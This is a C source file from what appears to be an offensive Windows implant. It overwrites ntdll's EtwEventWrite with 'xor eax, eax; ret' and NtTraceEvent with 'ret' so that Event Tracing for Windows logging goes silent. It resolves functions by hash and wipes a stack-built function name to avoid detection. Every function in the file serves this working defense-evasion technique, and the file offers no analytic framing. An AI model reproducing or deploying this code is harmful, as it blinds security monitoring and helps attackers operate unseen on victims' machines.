#include "EtwPatch.h"
#include "utils.h"
#include "ntdll.h"
#include <intrin.h>

// Global ETW patch state
ETW_PATCH_STATE g_EtwPatchState = { 0 };

// ETW bypass patch - returns success without logging
// xor eax, eax; ret (0x31 0xC0 0xC3)
static BYTE g_EtwPatch[] = { 0x31, 0xC0, 0xC3 };

// Helper to change memory protection
static BOOL ChangeMemoryProtection(PVOID pAddress, SIZE_T size, DWORD newProtect, PDWORD pOldProtect) {
    if (!ApiWin || !pAddress) return FALSE;
    return ApiWin->VirtualProtect(pAddress, size, newProtect, pOldProtect);
}

// Get EtwEventWrite address from ntdll
PVOID GetEtwEventWriteAddr() {
    if (g_EtwPatchState.pOriginalEtwEventWrite) {
        return g_EtwPatchState.pOriginalEtwEventWrite;
    }

    // ntdll is already loaded, get from ProcLoader
    HMODULE hNtdll = SysModules ? SysModules->Ntdll : NULL;
    if (!hNtdll) {
        hNtdll = GetModuleAddress(HASH_LIB_NTDLL);
    }

    if (!hNtdll) return NULL;

    // Get EtwEventWrite using DJB2 hash
    PVOID pAddr = GetSymbolAddress(hNtdll, HASH_FUNC_ETWEVENTWRITE);

    if (pAddr) {
        g_EtwPatchState.pOriginalEtwEventWrite = pAddr;
    }

    return pAddr;
}

// Main ETW patching function
BOOL PatchETW() {
    if (g_EtwPatchState.bIsPatched) {
        return TRUE; // Already patched
    }

    PVOID pEtwEventWrite = GetEtwEventWriteAddr();
    if (!pEtwEventWrite) {
        // ETW might not be available
        g_EtwPatchState.bIsPatched = TRUE;
        return TRUE;
    }

    DWORD oldProtect = 0;

    // Change memory protection to allow writing
    if (!ChangeMemoryProtection(pEtwEventWrite, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Save original bytes for restoration
    memcpy(g_EtwPatchState.originalBytes, pEtwEventWrite, 32);

    // Apply patch: xor eax, eax; ret
    // This makes EtwEventWrite return 0 (success) immediately
    memcpy(pEtwEventWrite, g_EtwPatch, sizeof(g_EtwPatch));

    g_EtwPatchState.patchSize = sizeof(g_EtwPatch);

    // Restore memory protection
    DWORD newProtect = 0;
    ChangeMemoryProtection(pEtwEventWrite, 32, oldProtect, &newProtect);

    // Flush instruction cache
    if (SysModules && SysModules->Ntdll) {
        typedef NTSTATUS(NTAPI* NtFlushInstructionCache_t)(HANDLE, PVOID, SIZE_T);
        NtFlushInstructionCache_t pNtFlushInstructionCache =
            (NtFlushInstructionCache_t)GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);

        if (pNtFlushInstructionCache) {
            pNtFlushInstructionCache((HANDLE)-1, pEtwEventWrite, 32);
        }
    }

    g_EtwPatchState.bIsPatched = TRUE;

    return TRUE;
}

// Alternative: Patch NtTraceEvent (deeper in the stack)
BOOL PatchETWNtTraceEvent() {
    HMODULE hNtdll = SysModules ? SysModules->Ntdll : NULL;
    if (!hNtdll) {
        hNtdll = GetModuleAddress(HASH_LIB_NTDLL);
    }

    if (!hNtdll) return FALSE;

    PVOID pNtTraceEvent = GetSymbolAddress(hNtdll, HASH_FUNC_NTTRACEEVENT);
    if (!pNtTraceEvent) {
        // Try with exported name
        char funcName[] = { 'N', 't', 'T', 'r', 'a', 'c', 'e', 'E', 'v', 'e', 'n', 't', 0 };
        pNtTraceEvent = (PVOID)GetProcAddress(hNtdll, funcName);
        memset(funcName, 0, sizeof(funcName));
    }

    if (!pNtTraceEvent) return FALSE;

    DWORD oldProtect = 0;
    if (!ChangeMemoryProtection(pNtTraceEvent, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Patch with ret instruction
    BYTE patch[] = { 0xC3 }; // ret
    memcpy(pNtTraceEvent, patch, sizeof(patch));

    DWORD newProtect = 0;
    ChangeMemoryProtection(pNtTraceEvent, 16, oldProtect, &newProtect);

    g_EtwPatchState.bIsPatched = TRUE;

    return TRUE;
}

// Restore original ETW functionality
BOOL RestoreETW() {
    if (!g_EtwPatchState.bIsPatched) {
        return TRUE; // Not patched, nothing to restore
    }

    PVOID pEtwEventWrite = g_EtwPatchState.pOriginalEtwEventWrite;
    if (!pEtwEventWrite) {
        g_EtwPatchState.bIsPatched = FALSE;
        return TRUE;
    }

    DWORD oldProtect = 0;
    if (!ChangeMemoryProtection(pEtwEventWrite, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Restore original bytes
    memcpy(pEtwEventWrite, g_EtwPatchState.originalBytes, 32);

    DWORD newProtect = 0;
    ChangeMemoryProtection(pEtwEventWrite, 32, oldProtect, &newProtect);

    // Flush instruction cache
    if (SysModules && SysModules->Ntdll) {
        typedef NTSTATUS(NTAPI* NtFlushInstructionCache_t)(HANDLE, PVOID, SIZE_T);
        NtFlushInstructionCache_t pNtFlushInstructionCache =
            (NtFlushInstructionCache_t)GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);

        if (pNtFlushInstructionCache) {
            pNtFlushInstructionCache((HANDLE)-1, pEtwEventWrite, 32);
        }
    }

    // Clear state
    memset(g_EtwPatchState.originalBytes, 0, sizeof(g_EtwPatchState.originalBytes));
    g_EtwPatchState.bIsPatched = FALSE;
    g_EtwPatchState.patchSize = 0;

    return TRUE;
}

// Check if ETW is patched
BOOL IsETWPatched() {
    return g_EtwPatchState.bIsPatched;
}

// Disable ETW via registry (requires admin)
BOOL DisableETWRegistry() {
    if (!IsElevate()) {
        return FALSE;
    }

    // This requires advapi32 functions
    if (!ApiWin) return FALSE;

    // Registry path for ETW providers
    // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels

    // For now, we'll rely on memory patching
    // Registry modification is more permanent and risky

    return PatchETW();
}

// Enable ETW via registry
BOOL EnableETWRegistry() {
    // Restore memory patches
    return RestoreETW();
}